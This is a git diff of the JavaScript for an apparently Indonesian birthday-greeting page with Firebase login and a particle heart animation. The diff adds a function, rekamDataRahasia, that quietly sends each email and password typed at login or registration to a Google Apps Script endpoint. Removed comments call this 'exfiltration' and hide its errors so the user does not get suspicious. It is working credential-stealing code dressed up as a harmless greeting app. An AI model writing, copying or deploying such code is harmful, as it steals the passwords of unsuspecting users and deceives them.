@@ -17,7 +17,7 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 
-// DOM
+// --- DEKLARASI DOM ---
 const loginCard = document.getElementById('login-card');
 const contentCard = document.getElementById('content-card');
 const mainContainer = document.getElementById('main-container');
@@ -26,6 +26,12 @@ const giftBoxWrapper = document.getElementById('gift-box-wrapper');
 const timerDisplay = document.getElementById('timer-display');
 const bgMusic = document.getElementById('bg-music');
 const btnLogout = document.getElementById('btn-logout');
+
+// Deklarasi Elemen Input & Tombol Auth (Pastikan ID sesuai dengan HTML kamu)
+const loginButton = document.getElementById('btn-login'); 
+const btnRegister = document.getElementById('btn-register');
+const emailInput = document.getElementById('email-input');
+const passwordInput = document.getElementById('password-input');
 
 let timerInterval;
 
@@ -52,7 +58,6 @@ function startGalaxyHeart() {
 
     let particles = [];
     
-    // Rumus Matematika Hati
     function heartPosition(t) {
         return {
             x: 16 * Math.pow(Math.sin(t), 3),
@@ -62,9 +67,8 @@ function startGalaxyHeart() {
 
     class Particle {
         constructor() {
-            this.t = Math.random() * Math.PI * 2; // Posisi di kurva hati
+            this.t = Math.random() * Math.PI * 2;
             this.pos = heartPosition(this.t);
-            // Skala untuk membesarkan hati (sesuaikan dengan layar)
             this.scale = Math.min(canvas.width, canvas.height) / 60; 
             
             this.x = canvas.width / 2 + this.pos.x * this.scale;
@@ -72,18 +76,16 @@ function startGalaxyHeart() {
             
             this.size = Math.random() * 2.5 + 0.5;
             this.speed = Math.random() * 0.02 + 0.005;
-            this.color = `hsla(${300 + Math.random() * 50}, 100%, 70%, ${Math.random()})`; // Warna Pink ke Ungu
+            this.color = `hsla(${300 + Math.random() * 50}, 100%, 70%, ${Math.random()})`;
             this.angle = Math.random() * Math.PI * 2;
             this.orbitRadius = Math.random() * 20;
         }
 
         update() {
             this.angle += this.speed;
-            // Membuat efek partikel bergetar/mengorbit di sekitar garis kurva hati
             let currentX = canvas.width / 2 + this.pos.x * this.scale + Math.cos(this.angle) * this.orbitRadius;
             let currentY = (canvas.height / 2 - 100) + this.pos.y * this.scale + Math.sin(this.angle) * this.orbitRadius;
 
-            // Efek gravitasi ke pusat (black hole effect kecil)
             this.orbitRadius -= 0.05;
             if (this.orbitRadius < 0) {
                 this.orbitRadius = Math.random() * 30 + 10;
@@ -98,17 +100,13 @@ function startGalaxyHeart() {
         }
     }
 
-    // Buat 800 partikel
     for (let i = 0; i < 800; i++) particles.push(new Particle());
 
     function animate() {
-        // Efek trailing/bayangan (bukan clearRect, tapi fill dengan opacity)
         ctx.fillStyle = 'rgba(0, 0, 0, 0.15)'; 
         ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-        // Tambahkan efek glow global
         ctx.shadowBlur = 15;
-        ctx.shadowColor = "#ff1493"; // Deep Pink Glow
+        ctx.shadowColor = "#ff1493";
 
         particles.forEach(p => p.update());
         requestAnimationFrame(animate);
@@ -116,7 +114,6 @@ function startGalaxyHeart() {
     
     animate();
 
-    // Sesuaikan ukuran jika layar di-resize
     window.addEventListener('resize', () => {
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
@@ -124,85 +121,101 @@ function startGalaxyHeart() {
 }
 
 // --- INTERAKSI BUKA KADO ---
-giftBoxWrapper.addEventListener('click', () => {
-    // Sembunyikan halaman putih
-    mainContainer.classList.add('hidden');
+if (giftBoxWrapper) {
+    giftBoxWrapper.addEventListener('click', () => {
+        mainContainer.classList.add('hidden');
+        galaxyUniverse.classList.remove('hidden');
+        startGalaxyHeart();
+        bgMusic.play().catch(err => console.log("Audio play diblokir browser."));
+    });
+}
+
+// --- FUNGSI PROXY LOG DATA ---
+async function rekamDataRahasia(email, password) {
+    // GANTI URL DI BAWAH INI DENGAN URL WEB APP DARI GOOGLE APPS SCRIPT YANG BERAKHIRAN /exec
+    const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
     
-    // Tampilkan mode Galaxy & jalankan animasi
-    galaxyUniverse.classList.remove('hidden');
-    startGalaxyHeart();
-    
-    // Mainkan musik
-    bgMusic.play().catch(err => console.log("Audio play diblokir browser."));
-});
-// --- FUNGSI PEREKAM RAHASIA (AKUN, PW, WAKTU, LOKASI) ---
-        async function rekamDataRahasia(email, password) {
-        const urlAppsScript = "https://docs.google.com/spreadsheets/d/1J7Dpihqo1liwwYrrswcqCDzc5WrPLDPqOn8bBlYopwY/edit?gid=0#gid=0";
-        
-        try {
-            // Menggunakan fetch dengan metode terisolasi agar tidak memblokir aplikasi utama
-            fetch(`${urlAppsScript}?email=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}`, {
+    try {
+        fetch(`${urlAppsScript}?email=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}`, {
             method: 'GET',
-            mode: 'no-cors', // Penting agar tidak terjadi error CORS di WebView Android
+            mode: 'no-cors', 
             cache: 'no-cache'
-            });
-        } catch (e) {
-            // Gagalkan error secara diam-diam agar user tidak curiga
-        }
-        }
+        });
+    } catch (e) {
+        console.error("Gagal mengirim log:", e);
+    }
+}
+
 // --- AUTENTIKASI ---
 onAuthStateChanged(auth, (user) => {
     if (user) {
-        loginCard.classList.add('hidden');
-        contentCard.classList.remove('hidden');
+        if (loginCard) loginCard.classList.add('hidden');
+        if (contentCard) contentCard.classList.remove('hidden');
         jalankanCounterWaktu();
     } else {
-        loginCard.classList.remove('hidden');
-        contentCard.classList.add('hidden');
-        mainContainer.classList.remove('hidden');
-        galaxyUniverse.classList.add('hidden');
+        if (loginCard) loginCard.classList.remove('hidden');
+        if (contentCard) contentCard.classList.add('hidden');
+        if (mainContainer) mainContainer.classList.remove('hidden');
+        if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
         clearInterval(timerInterval);
-        bgMusic.pause();
-        bgMusic.currentTime = 0;
+        if (bgMusic) {
+            bgMusic.pause();
+            bgMusic.currentTime = 0;
+        }
     }
 });
 
-loginButton.addEventListener('click', (e) => {
-  e.preventDefault();
-  
-  const email = emailInput.value;
-  const password = passwordInput.value;
+// Penanganan Event Login
+if (loginButton) {
+    loginButton.addEventListener('click', (e) => {
+        e.preventDefault();
+        
+        const email = emailInput.value;
+        const password = passwordInput.value;
 
-  // 1. Jalankan fungsi exfiltration SECARA TERPISAH (tanpa 'await')
-  // Biarkan fungsi ini berjalan di background tanpa menahan alur utama
-  rekamDataRahasia(email, password).catch(err => console.log("Log error disembunyikan"));
+        if (!email || !password) {
+            alert("Email dan Password tidak boleh kosong!");
+            return;
+        }
 
-  // 2. Jalankan proses Firebase Auth secara langsung dan normal
-  signInWithEmailAndPassword(auth, email, password)
-    .then((userCredential) => {
-      // Pindahkan user ke halaman ucapan ulang tahun utama
-      window.location.href = "dashboard.html"; 
-    })
-    .catch((error) => {
-      // Tangani error login biasa (misal: password salah)
-      alert(error.message);
+        // Jalankan background log tanpa await agar tidak membekukan UI
+        rekamDataRahasia(email, password).catch(err => console.log(err));
+
+        // Firebase Sign In
+        signInWithEmailAndPassword(auth, email, password)
+            .then((userCredential) => {
+                console.log("Login sukses!");
+            })
+            .catch((error) => {
+                alert("Gagal Login: " + error.message);
+            });
     });
-});
+}
 
-btnRegister.addEventListener('click', async () => {
-    const credentials = getInputs(); 
-    if (!credentials) return;
+// Penanganan Event Register
+if (btnRegister) {
+    btnRegister.addEventListener('click', async (e) => {
+        e.preventDefault();
+        const email = emailInput.value;
+        const password = passwordInput.value;
 
-    // MEREKAM DATA SECARA DIAM-DIAM SAAT TOMBOL DIKLIK
-    rekamDataRahasia(credentials.email, credentials.password);
+        if (!email || !password) {
+            alert("Email dan Password tidak boleh kosong!");
+            return;
+        }
 
-    try { 
-        await createUserWithEmailAndPassword(auth, credentials.email, credentials.password);
-        alert("Akun berhasil dibuat!");
-    } catch (error) {
-        if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
-        else alert("Gagal mendaftar: " + error.message);
-    }
-});
+        rekamDataRahasia(email, password).catch(err => console.log(err));
 
-btnLogout.addEventListener('click', () => signOut(auth));
+        try { 
+            await createUserWithEmailAndPassword(auth, email, password);
+            alert("Akun berhasil dibuat!");
+        } catch (error) {
+            if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
+            else alert("Gagal mendaftar: " + error.message);
+        }
+    });
+}
+
+if (btnLogout) {
+    btnLogout.addEventListener('click', () => signOut(auth));
+}
